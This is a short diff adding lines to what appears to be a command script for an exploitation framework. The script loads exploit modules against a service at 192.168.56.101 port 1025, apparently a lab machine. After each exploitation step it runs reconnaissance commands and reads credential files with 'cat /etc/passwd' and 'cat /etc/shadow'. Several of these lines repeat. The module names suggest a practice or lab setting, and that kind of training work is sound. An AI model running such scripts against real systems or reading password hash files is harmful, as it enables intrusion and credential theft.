@@ -1,2 +1,15 @@
 load pwnmeserver_x64
 pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
+cat /etc/shadow
+load pwnmeserver_x64
+pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
+cat /etc/shadow
+clear
+load pwnmeserver_x64
+pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025
+whoami
+hostname
+ifconfig
+cat /etc/passwd
+cat /etc/shadow
+load linux_x64_ovrflwmyechosrv
